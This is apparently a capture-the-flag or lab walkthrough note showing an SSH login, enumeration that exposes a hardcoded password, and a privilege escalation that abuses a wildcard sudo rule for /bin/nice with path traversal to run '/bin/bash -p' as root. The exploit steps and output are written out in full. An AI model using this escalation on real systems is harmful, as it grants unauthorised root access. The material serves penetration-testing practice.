# 5 :22 ssh, box enum

```
$ ssh webadmin@192.168.191.101
webadmin@serv:~$ whoami;id;hostname
webadmin
uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
serv

webadmin@serv:/var/www/html/admin$ cat index.php
<?php
$pass= "serdesfsefhijosefjtfgyuhjiosefdfthgyjh";
[truncated]

webadmin@serv:~$ sudo -l
[sudo] password for webadmin:
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

webadmin@serv:/notes$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 .
drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
-rwx------  1 root root   11 Aug  2  2020 clear.sh
-rwx------  1 root root    8 Aug  2  2020 id.sh

# we have wildcard so lets mess around with the path

webadmin@serv:~$ echo "/bin/bash -p" > kashz.sh
webadmin@serv:~$ chmod +x kashz.sh

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/kashz.sh
root@serv:/home/webadmin# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
serv
```
